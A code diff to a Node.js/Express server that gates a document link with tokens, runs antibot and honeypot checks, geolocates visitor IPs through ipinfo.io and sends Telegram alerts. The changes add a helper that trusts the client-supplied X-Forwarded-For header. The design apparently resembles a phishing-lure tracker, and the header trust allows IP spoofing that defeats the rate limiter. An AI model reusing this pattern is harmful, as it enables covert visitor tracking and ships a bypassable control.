@@ -11,6 +11,11 @@ const PORT = process.env.PORT || 3000;
 const DOCUMENT_URL = process.env.DOCUMENT_URL || 'https://example.com/your-secure-document';
 const TOKEN_TTL_MS = (parseInt(process.env.TOKEN_TTL_MIN || '10', 10) * 60 * 1000);
 
+app.use(express.json());
+
+// 🔹 Trust proxy so req.ip gives real client IP
+app.set('trust proxy', true);
+
 // In-memory stores
 let tokens = {};
 let accessLogs = [];
@@ -31,7 +36,7 @@ const limiter = rateLimit({
   standardHeaders: true,
   legacyHeaders: false,
   handler: (req, res) => {
-    logLine(`RATE_LIMIT_EXCEEDED ip=${req.ip} path=${req.originalUrl}`);
+    logLine(`RATE_LIMIT_EXCEEDED ip=${getClientIp(req)} path=${req.originalUrl}`);
     res.status(429).send('Too many requests. Try again later.');
   }
 });
@@ -43,6 +48,13 @@ app.use('/static', express.static(path.join(__dirname)));
 // Generate token
 function generateToken() {
   return crypto.randomBytes(32).toString('hex');
+}
+
+// 🔹 Extract real client IP
+function getClientIp(req) {
+  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip || '';
+  if (ip.includes(',')) ip = ip.split(',')[0]; // first IP in case of multiple
+  return ip.replace('::ffff:', '').trim();
 }
 
 // Endpoint for antibot reports
@@ -101,6 +113,10 @@ app.post("/submit", (req, res) => {
 
 // Get IP info + local time
 async function getIPInfo(ip) {
+  if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+    return { country: 'LOCAL', city: 'LOCAL', isp: 'LAN', timezone: 'LOCAL', localTime: new Date().toLocaleString() };
+  }
+
   try {
     const resp = await fetch(`https://ipinfo.io/${ip}?token=${process.env.IP_INFO_KEY}`);
     if (!resp.ok) return {};
@@ -176,7 +192,7 @@ app.get('/', async (req, res) => {
   cleanupTokens();
 
   const token = req.query.token;
-  const clientIp = req.ip.replace('::ffff:', '');
+  const clientIp = getClientIp(req);
 
   // Send Telegram only once per IP
   const ipInfo = await getIPInfo(clientIp);
@@ -225,7 +241,7 @@ app.get('/', async (req, res) => {
 // Document redirect with honeypot check
 app.get('/redirect-document', async (req, res) => {
   const honeypot = req.query.hp_field;
-  const clientIp = req.ip.replace('::ffff:', '');
+  const clientIp = getClientIp(req);
   const ua = req.get('User-Agent');
 
   if (honeypot && honeypot.trim() !== '') {
@@ -249,7 +265,6 @@ app.get('/redirect-document', async (req, res) => {
   res.redirect(DOCUMENT_URL);
 });
 
-
 // Status endpoint
 app.get('/__status', (req, res) => {
   res.json({
@@ -264,4 +279,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on http://0.0.0.0:${PORT}`);
   logLine(`SERVER_STARTED port=${PORT}`);
 });
-
